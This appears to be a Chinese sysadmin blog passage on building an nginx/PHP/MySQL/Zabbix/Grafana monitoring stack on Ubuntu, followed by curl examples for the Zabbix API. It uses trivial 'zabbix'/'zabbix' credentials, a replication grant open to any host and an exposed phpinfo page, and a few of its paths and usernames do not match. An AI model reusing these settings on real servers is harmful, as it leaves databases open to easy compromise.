<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装nginx-php"><a href="#安装nginx-php" class="headerlink" title="安装nginx + php"></a>安装nginx + php</h3><h4 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install make gcc g++ libpcre3-dev libssl-dev libpng-dev libxml2-dev libcurl4-openssl-dev</span><br></pre></td></tr></table></figure>

<h4 id="编译安装nginx"><a href="#编译安装nginx" class="headerlink" title="编译安装nginx"></a>编译安装nginx</h4><p>创建运行账户及组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo groupadd www</span><br><span class="line">sudo useradd www -s /sbin/nologin -g www</span><br></pre></td></tr></table></figure>

<p>开始编译nginx</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://nginx.org/download/nginx-1.10.1.tar.gz</span><br><span class="line">sudo tar zxvf nginx-1.10.1.tar.gz </span><br><span class="line">cd nginx-1.10.1/</span><br><span class="line">sudo ./configure --user=www --group=www --prefix=/opt/nginx --with-http_stub_status_module --with-http_ssl_module</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">cd /opt</span><br><span class="line">sudo chown -R www.www nginx</span><br></pre></td></tr></table></figure>

<p>创建nginx启动脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/init.d/nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## BEGIN INIT INFO  </span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Provides:     nginx  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Required-Start:  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Required-Stop:  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default-Start:        2 3 4 5  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default-Stop:         0 1 6  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Short-Description: nginx  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Description: nginx server  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## END INIT INFO  </span></span></span><br><span class="line">  </span><br><span class="line">. /lib/lsb/init-functions  </span><br><span class="line">  </span><br><span class="line">PROGRAM=/opt/nginx/sbin/nginx  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">test -x $PROGRAM || exit 0  </span><br><span class="line">  </span><br><span class="line">case "$1" in  </span><br><span class="line">  start)  </span><br><span class="line">     log_begin_msg "Starting Nginx server"  </span><br><span class="line">     /opt/nginx/sbin/nginx  </span><br><span class="line">     log_end_msg 0  </span><br><span class="line">          ;;  </span><br><span class="line">  stop)  </span><br><span class="line">     PID=`cat /opt/nginx/logs/nginx.pid`  </span><br><span class="line">     log_begin_msg "Stopping Nginx server"  </span><br><span class="line">     if [ ! -z "$PID" ]; then  </span><br><span class="line">        kill -15 $PID  </span><br><span class="line">     fi  </span><br><span class="line">     log_end_msg 0  </span><br><span class="line">     ;;  </span><br><span class="line">  restart)  </span><br><span class="line">     $0 stop  </span><br><span class="line">     $0 start  </span><br><span class="line">     ;;  </span><br><span class="line">  *)  </span><br><span class="line">     log_success_msg "Usage: service nginx &#123;start|stop|restart&#125;"  </span><br><span class="line">     exit 1  </span><br><span class="line">esac  </span><br><span class="line">  </span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>添加启动权限并启动nginx</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /etc/init.d/nginx</span><br><span class="line">sudo /etc/init.d/nginx start</span><br><span class="line">sudo update-rc.d nginx defaults</span><br></pre></td></tr></table></figure>

<p>验证是否安装成功。在浏览器地址栏输入ip,出现下图为ok.</p>
<p><img src="/articles/3131633d/1.png" alt="img"></p>
<h3 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h3><h4 id="安装bzip2"><a href="#安装bzip2" class="headerlink" title="安装bzip2"></a>安装bzip2</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://www.bzip.org/1.0.6/bzip2-1.0.6.tar.gz</span><br><span class="line">sudo tar zxvf bzip2-1.0.6.tar.gz</span><br><span class="line">cd bzip2-1.0.6/</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##64位系统需要修改Makefile文件后再make，修改内容如下</span></span></span><br><span class="line">CC=gcc -fPIC</span><br><span class="line">sudo make</span><br><span class="line">sudo make install PREFIX=/opt/bzip2</span><br></pre></td></tr></table></figure>

<h4 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://heanet.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gz</span><br><span class="line">sudo tar zxvf zlib-1.2.8.tar.gz</span><br><span class="line">cd zlib-1.2.8/</span><br><span class="line">sudo ./configure --prefix=/opt/zlib</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h4 id="安装libmcrypt"><a href="#安装libmcrypt" class="headerlink" title="安装libmcrypt"></a>安装libmcrypt</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://jaist.dl.sourceforge.net/project/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gz</span><br><span class="line">sudo tar zxvf libmcrypt-2.5.8.tar.gz</span><br><span class="line">cd libmcrypt-2.5.8/</span><br><span class="line">sudo ./configure --prefix=/opt/libmcrypt</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h4 id="安装freetype"><a href="#安装freetype" class="headerlink" title="安装freetype"></a>安装freetype</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://ftp.yzu.edu.tw/nongnu//freetype/freetype-2.6.tar.gz</span><br><span class="line">sudo tar zxvf freetype-2.6.tar.gz </span><br><span class="line">cd freetype-2.6/</span><br><span class="line">sudo ./configure --prefix=/opt/freetype</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h4 id="安装jpegsrc（zabbix需要）"><a href="#安装jpegsrc（zabbix需要）" class="headerlink" title="安装jpegsrc（zabbix需要）"></a>安装jpegsrc（zabbix需要）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://www.ijg.org/files/jpegsrc.v9b.tar.gz </span><br><span class="line">sudo tar zxvf jpegsrc.v9b.tar.gz</span><br><span class="line">cd jpeg-9b/</span><br><span class="line">sudo ./configure --prefix=/opt/jpeg</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h4 id="编译安装php"><a href="#编译安装php" class="headerlink" title="编译安装php"></a>编译安装php</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">sudo wget http://ar2.php.net/distributions/php-5.6.23.tar.gz</span><br><span class="line">sudo tar zxvf php-5.6.23.tar.gz </span><br><span class="line">cd php-5.6.23/</span><br><span class="line">sudo  ./configure --prefix=/opt/php --with-config-file-path=/opt/php/etc --enable-fpm --with-mcrypt=/opt/libmcrypt --with-zlib=/opt/zlib --with-openssl --with-mysql --with-mysql-sock --with-gd --enable-xml --with-bz2=/usr/local/lib --enable-zip --with-freetype-dir=/opt/freetype --with-mysqli --enable-mysqlnd  --with-curl --enable-mbstring --enable-bcmath --enable-sockets --with-jpeg-dir=/opt/jpeg --with-gd --with-gettext</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">cd /opt</span><br><span class="line">sudo chown -R www.www php</span><br></pre></td></tr></table></figure>

<h3 id="整合nginx-php"><a href="#整合nginx-php" class="headerlink" title="整合nginx + php"></a>整合nginx + php</h3><h4 id="创建php、php-fpm配置文件"><a href="#创建php、php-fpm配置文件" class="headerlink" title="创建php、php-fpm配置文件"></a>创建php、php-fpm配置文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp /opt/php-5.6.23/php.ini-production /opt/php/etc/php.ini</span><br><span class="line">sudo vim /opt/php/etc/php.ini </span><br><span class="line">修改如下行</span><br><span class="line">    date.timezone = Asia/Shanghai</span><br><span class="line">sudo cp /opt/php/etc/php-fpm.conf.default /opt/php/etc/php-fpm.conf</span><br><span class="line">sudo vim /opt/php/etc/php-fpm.conf</span><br><span class="line">修改如下行</span><br><span class="line">user = www</span><br><span class="line">group = www</span><br><span class="line">pid = run/php-fpm.pid</span><br></pre></td></tr></table></figure>

<h4 id="创建php-fpm启动脚本、启动php-fpm"><a href="#创建php-fpm启动脚本、启动php-fpm" class="headerlink" title="创建php-fpm启动脚本、启动php-fpm"></a>创建php-fpm启动脚本、启动php-fpm</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/init.d/php-fpm</span><br><span class="line">贴入如下内容</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## BEGIN INIT INFO  </span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Provides:     nginx  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Required-Start:  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Required-Stop:  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default-Start:        2 3 4 5  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Default-Stop:         0 1 6  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Short-Description: nginx  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Description: nginx server  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## END INIT INFO  </span></span></span><br><span class="line">. /lib/lsb/init-functions</span><br><span class="line">PROGRAM=/opt/php/sbin/php-fpm</span><br><span class="line">test -x $PROGRAM || exit 0</span><br><span class="line">case "$1" in</span><br><span class="line">  start)</span><br><span class="line">     log_begin_msg "Starting php-fpm server"</span><br><span class="line">     /opt/php/sbin/php-fpm -y /opt/php/etc/php-fpm.conf -c /opt/php/etc/php.ini </span><br><span class="line">     log_end_msg 0</span><br><span class="line">     ;;</span><br><span class="line">   stop)</span><br><span class="line">     PID=`cat /opt/php/var/run/php-fpm.pid`</span><br><span class="line">     log_begin_msg "Stopping php-fpm server"</span><br><span class="line">     if [ ! -z "$PID" ]; then</span><br><span class="line">        kill -15 $PID</span><br><span class="line">     fi</span><br><span class="line">     log_end_msg 0</span><br><span class="line">     ;;</span><br><span class="line">  restart)</span><br><span class="line">     $0 stop</span><br><span class="line">     $0 start</span><br><span class="line">     ;;</span><br><span class="line">  *)</span><br><span class="line">     log_success_msg "Usage: service php-fpm &#123;start|stop|restart&#125;"</span><br><span class="line">     exit 1</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /etc/init.d/php-fpm</span><br><span class="line">sudo /etc/init.d/php-fpm start</span><br><span class="line">sudo update-rc.d php-fpm defaults</span><br></pre></td></tr></table></figure>

<h4 id="修改nginx配置文件，创建index-php，测试整合成功"><a href="#修改nginx配置文件，创建index-php，测试整合成功" class="headerlink" title="修改nginx配置文件，创建index.php，测试整合成功"></a>修改nginx配置文件，创建index.php，测试整合成功</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /opt/nginx/conf/nginx.conf</span><br><span class="line">修改如下内容</span><br><span class="line">user  www;</span><br><span class="line">pid        logs/nginx.pid;</span><br><span class="line">#默认首页index.php</span><br><span class="line">location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm index.php;</span><br><span class="line">        &#125;</span><br><span class="line">#php文件交给fastcgi处理</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="创建测试页面index-php"><a href="#创建测试页面index-php" class="headerlink" title="创建测试页面index.php"></a>创建测试页面index.php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /opt/nginx/html/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="重启nginx"><a href="#重启nginx" class="headerlink" title="重启nginx"></a>重启nginx</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/nginx restart</span><br></pre></td></tr></table></figure>

<p>验证是否整合成功，地址栏：ip/index.php,如出现下图，整合成功。</p>
<p><img src="/articles/3131633d/2.png" alt="img"></p>
<h3 id="编译安装mysql"><a href="#编译安装mysql" class="headerlink" title="编译安装mysql"></a>编译安装mysql</h3><h4 id="安装依赖包-1"><a href="#安装依赖包-1" class="headerlink" title="安装依赖包"></a>安装依赖包</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install g++ cmake ncurses-dev</span><br><span class="line">cd /opt</span><br><span class="line">sudo wget http://heanet.dl.sourceforge.net/project/boost/boost/1.59.0/boost_1_59_0.tar.gz</span><br><span class="line">sudo tar zxvf boost_1_59_0.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="创建用户和用户组"><a href="#创建用户和用户组" class="headerlink" title="创建用户和用户组"></a>创建用户和用户组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建mysql用户及用户组，创建mysql-data目录</span></span><br><span class="line">sudo groupadd mysql</span><br><span class="line">sudo useradd mysql -s /sbin/nologin -g mysql</span><br><span class="line">sudo mkdir -p /data/postmall/mysql/data</span><br><span class="line">cd /data/postmall/</span><br><span class="line">sudo chown -R mysql.mysql mysql</span><br></pre></td></tr></table></figure>

<h4 id="编译安装mysql-1"><a href="#编译安装mysql-1" class="headerlink" title="编译安装mysql"></a>编译安装mysql</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo wget http://cdn.mysql.com//Downloads/MySQL-5.7/mysql-5.7.13.tar.gz</span><br><span class="line">sudo tar zxvf mysql-5.7.13.tar.gz </span><br><span class="line">cd mysql-5.7.13/</span><br><span class="line">sudo cmake -DCMAKE_INSTALL_PREFIX=/opt/mysql -DMYSQL_DATADIR=/data/postmall/mysql/data -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DENABLED_LOCAL_INFILE=1 -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/opt/boost_1_59_0</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">cd /opt</span><br><span class="line">chown -R mysql.mysql mysql</span><br></pre></td></tr></table></figure>

<h4 id="初始化mysql"><a href="#初始化mysql" class="headerlink" title="初始化mysql"></a>初始化mysql</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/mysql/bin</span><br><span class="line">sudo ./mysqld --initialize --user=mysql --datadir=/data/postmall/mysql/data --basedir=/opt/mysql --socket=/var/mysql.sock</span><br><span class="line"><span class="meta">#</span><span class="bash">创建mysql配置文件和启动脚本</span></span><br><span class="line">sudo cp support-files/my-default.cnf /etc/my.cnf</span><br><span class="line">sudo cp support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line">sudo chmod +x /etc/init.d/mysqld</span><br><span class="line"><span class="meta">#</span><span class="bash">将mysql加入系统搜索路径（环境变量）</span></span><br><span class="line">cd /opt/mysql/bin</span><br><span class="line">sudo cp mysql /usr/bin/</span><br></pre></td></tr></table></figure>

<h4 id="启动并登陆mysql"><a href="#启动并登陆mysql" class="headerlink" title="启动并登陆mysql"></a>启动并登陆mysql</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/mysqld start</span><br></pre></td></tr></table></figure>

<h4 id="mysql主备配置"><a href="#mysql主备配置" class="headerlink" title="mysql主备配置:"></a>mysql主备配置:</h4><p>   修改主服务器master:  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">vi  my.cnf</span></span><br><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin   </span><br><span class="line">server-id=1  </span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">bind</span>-address            = 127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>   修改从服务器slave:    </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">vi /etc/my.cnf</span></span><br><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin  </span><br><span class="line">server-id=2</span><br></pre></td></tr></table></figure>

<p>在主服务器上建立帐户并授权slave:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash">GRANT REPLICATION SLAVE ON *.* to <span class="string">'zabbix'</span>@<span class="string">'%'</span> identified by <span class="string">'zabbix'</span>;</span></span><br></pre></td></tr></table></figure>

<p> 登录主服务器的mysql，查询master的状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash">show master status;</span></span><br><span class="line">   +------------------+----------+--------------+------------------+</span><br><span class="line">   | File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |</span><br><span class="line">   +------------------+----------+--------------+------------------+</span><br><span class="line">   | mysql-bin.000004 |      308 |              |                  |</span><br><span class="line">   +------------------+----------+--------------+------------------+</span><br><span class="line">   1 row in set (0.00 sec)</span><br><span class="line">   注：执行完此步骤后不要再操作主服务器MYSQL，防止主服务器状态值变化</span><br></pre></td></tr></table></figure>

<p>配置从服务器Slave：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash">change master to master_host=<span class="string">'172.25.200.55'</span>,master_user=<span class="string">'zabbix'</span>,master_password=<span class="string">'zabbix'</span>,</span></span><br><span class="line">        master_log_file='mysql-bin.000004',master_log_pos=308;   //注意不要断开，308数字前后无单引号。</span><br><span class="line"></span><br><span class="line"><span class="meta">Mysql&gt;</span><span class="bash">start slave;</span></span><br></pre></td></tr></table></figure>

<p>检查从服务器复制功能状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show slave status\G</span></span><br><span class="line"></span><br><span class="line">   *************************** 1. row ***************************</span><br><span class="line"></span><br><span class="line">              Slave_IO_State: Waiting for master to send event</span><br><span class="line">              Master_Host: 172.25.200.55  //主服务器地址</span><br><span class="line">              Master_User: mysync   //授权帐户名，尽量避免使用root</span><br><span class="line">              Master_Port: 3306    //数据库端口，部分版本没有此行</span><br><span class="line">              Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.000004</span><br><span class="line">              Read_Master_Log_Pos: 600     //#同步读取二进制日志的位置，大于等于Exec_Master_Log_Pos</span><br><span class="line">              Relay_Log_File: ddte-relay-bin.000003</span><br><span class="line">              Relay_Log_Pos: 251</span><br><span class="line">              Relay_Master_Log_File: mysql-bin.000004</span><br><span class="line">              Slave_IO_Running: Yes    //此状态必须YES</span><br><span class="line">              Slave_SQL_Running: Yes     //此状态必须YES</span><br><span class="line">                    ......</span><br><span class="line"></span><br><span class="line">注：Slave_IO及Slave_SQL进程必须正常运行，即YES状态，否则都是错误的状态(如：其中一个NO均属错误)。</span><br><span class="line"></span><br><span class="line">以上操作过程，主从服务器配置完成。</span><br></pre></td></tr></table></figure>

<h3 id="编译安装zabbix"><a href="#编译安装zabbix" class="headerlink" title="编译安装zabbix"></a>编译安装zabbix</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.0.3/zabbix-3.0.3.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf zabbix-3.0.3.tar.gz</span><br><span class="line">cd  zabbix-3.0.3/</span><br><span class="line">mkdir -p  /opt/zabbix</span><br><span class="line"></span><br><span class="line">[ 各种库文件安装 ]</span><br><span class="line">方法：sudo apt-get install make libmysqld-dev  libmysqlclient-dev   libxml2-dev   snmp  snmpd  libsnmp-dev   libcurl4-openssl-dev  openjdk-6-jdk</span><br><span class="line"></span><br><span class="line">[ 编译 ]</span><br><span class="line"></span><br><span class="line">./configure  --prefix=/opt/zabbix  --enable-java   --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2</span><br><span class="line"></span><br><span class="line">[ 安装]</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h4 id="配置zabbix"><a href="#配置zabbix" class="headerlink" title="配置zabbix"></a>配置zabbix</h4><p>创建zabbix数据库，并导入zabbix数据库文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建数据库</span></span><br><span class="line">mysql -u root -p</span><br><span class="line">create database zabbix character set utf8;</span><br><span class="line">grant all on zabbix.* to 'zabbix'@'172.25.200.54' identified by 'zabbix';</span><br><span class="line">grant all on zabbix.* to 'zabbix'@'172.25.200.56' identified by 'zabbix';</span><br><span class="line">grant all on zabbix.* to 'zabbix'@'localhost' identified by 'zabbix';</span><br><span class="line">flush privileges;</span><br><span class="line">exit;</span><br><span class="line"><span class="meta">#</span><span class="bash">导入数据库文件</span></span><br><span class="line">cd /opt</span><br><span class="line">sudo wget http://repo.zabbix.com/zabbix/3.0/ubuntu/pool/main/z/zabbix/zabbix_3.0.3.orig.tar.gz </span><br><span class="line">sudo tar zxvf zabbix_3.0.3.orig.tar.gz</span><br><span class="line">cd zabbix-3.0.3/database/mysql</span><br><span class="line">mysql -uzabbix -pzabbix zabbix &lt; schema.sql</span><br><span class="line">mysql -uzabbix -pzabbix zabbix &lt; images.sql</span><br><span class="line">mysql -uzabbix -pzabbix zabbix &lt; data.sql</span><br></pre></td></tr></table></figure>

<h4 id="配置zabbix-server-conf"><a href="#配置zabbix-server-conf" class="headerlink" title="配置zabbix_server.conf"></a>配置zabbix_server.conf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/zabbix/etc/zabbix_server.conf</span><br><span class="line">LogFile=/var/log/zabbix/zabbix_server.log  #如没有/var/log/zabbix目录，请创建</span><br><span class="line">DBHost=172.25.200.55</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=zabbix</span><br></pre></td></tr></table></figure>

<h4 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /opt/php/etc/php.ini</span><br><span class="line">post_max_size = 16M</span><br><span class="line">max_execution_time = 300</span><br><span class="line">max_input_time = 300</span><br></pre></td></tr></table></figure>

<h4 id="配置zabbix页面"><a href="#配置zabbix页面" class="headerlink" title="配置zabbix页面"></a>配置zabbix页面</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/zabbix-3.0.3/frontends/php/</span><br><span class="line">sudo cp -a . /data/zabbix/</span><br><span class="line">cd /data/</span><br><span class="line">sudo chown -R www.www zabbix </span><br><span class="line">mv /zabbix/conf/zabbix.conf.php.example  /zabbix/conf/zabbix.conf.php</span><br><span class="line">sudo vim /var/www/html/zabbix/conf/zabbix.conf.php</span><br><span class="line">修改项</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">DB[<span class="string">'DATABASE'</span>] = <span class="string">'zabbix'</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">DB[<span class="string">'USER'</span>] = <span class="string">'zabbix'</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">DB[<span class="string">'PASSWORD'</span>] = <span class="string">'zabbix'</span></span></span><br></pre></td></tr></table></figure>

<h4 id="配置nginx-conf"><a href="#配置nginx-conf" class="headerlink" title="配置nginx.conf"></a>配置nginx.conf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /opt/nginx/conf/nginx.conf</span><br><span class="line"> location / &#123;</span><br><span class="line">            root   /data/postmall;</span><br><span class="line">            index  index.html index.htm index.php;</span><br><span class="line">        &#125;</span><br><span class="line"> location ~ \.php$ &#123;</span><br><span class="line">            root           /data/postmall;</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="重启zabbix、php-fpm-、nginx"><a href="#重启zabbix、php-fpm-、nginx" class="headerlink" title="重启zabbix、php-fpm 、nginx"></a>重启zabbix、php-fpm 、nginx</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/zabbix_server restart</span><br><span class="line">sudo /etc/init.d/php-fpm restart</span><br><span class="line">sudo /etc/init.d/nginx restart</span><br></pre></td></tr></table></figure>

<h3 id="安装grafana"><a href="#安装grafana" class="headerlink" title="安装grafana"></a>安装grafana</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://grafanarel.s3.amazonaws.com/builds/grafana_3.1.0-1468321182_amd64.deb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install -y adduser libfontconfig</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i grafana_3.1.0-1468321182_amd64.deb</span></span><br><span class="line">grafana-cli plugins list-remote</span><br><span class="line">grafana-cli plugins install alexanderzobnin-zabbix-app</span><br><span class="line">service grafana-server restart</span><br></pre></td></tr></table></figure>

<h3 id="安装zatree"><a href="#安装zatree" class="headerlink" title="安装zatree"></a>安装zatree</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/BillWang139967/zatree.git</span><br><span class="line">cd zatree/zabbix-3.0.x/</span><br><span class="line">bash start.sh</span><br><span class="line">执行过程中需要输入zabbix admin的账号和密码</span><br><span class="line">调整php页面文件（header.php，echart.php，peckvalue.php，zabbix_zatree.php）详情请参考wiki上《Zatree for zabbix 3.0.x》及其附件。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix api调用步骤</title>
    <url>/articles/4c04639e.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>明确调用zabbix api的步骤，便于利用zabbix进行二次开发。</p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>简单来说，zabbix api调用分4步：获取userid–&gt;获取hostid–&gt;获取itemid–&gt;根据时间节点获取数据，流程如下:</p>
<p><img src="/articles/4c04639e/1.png" alt></p>
<a id="more"></a>

<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h4 id="获取userid"><a href="#获取userid" class="headerlink" title="获取userid:"></a>获取userid:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc":"2.0","method":"user.login","params":&#123;"user":"xxxx","password":"xxxx"&#125;,"auth":null,"id":0&#125;' http://x.x.x.x/api_jsonrpc.php</span><br></pre></td></tr></table></figure>



<h4 id="获取hostid"><a href="#获取hostid" class="headerlink" title="获取hostid:"></a>获取hostid:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc": "2.0","method":"host.get","params":&#123;"output":["hostid"],"filter": &#123;"host":"192.168.211.60"&#125;&#125;,"auth": "a826fca79a0795ccc1224dc76329972f","id": 0&#125;' http://x.x.x.x/api_jsonrpc.php</span><br></pre></td></tr></table></figure>



<h4 id="获取itemid"><a href="#获取itemid" class="headerlink" title="获取itemid:"></a>获取itemid:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc": "2.0","method":"item.get","params":&#123;"output":"itemids","hostids":"10243","search":&#123;"key_":"system.cpu.util[,idle,avg1]"&#125;&#125;,"auth": "a826fca79a0795ccc1224dc76329972f","id": 0&#125;'  http://x.x.x.x/api_jsonrpc.php</span><br></pre></td></tr></table></figure>



<h4 id="获取数据："><a href="#获取数据：" class="headerlink" title="获取数据："></a>获取数据：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -X POST -H 'Content-Type: application/json' -d '&#123;"jsonrpc": "2.0","method":"history.get","params":&#123;"history":0,"itemids":["24526"],"time_from":"1392789600","time_till":"1392790200","output":"extend"&#125;,"auth": "a826fca79a0795ccc1224dc76329972f","id": 0&#125;'  http://x.x.x.x/api_jsonrpc.php</span><br></pre></td></tr></table></figure>

<p>c</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
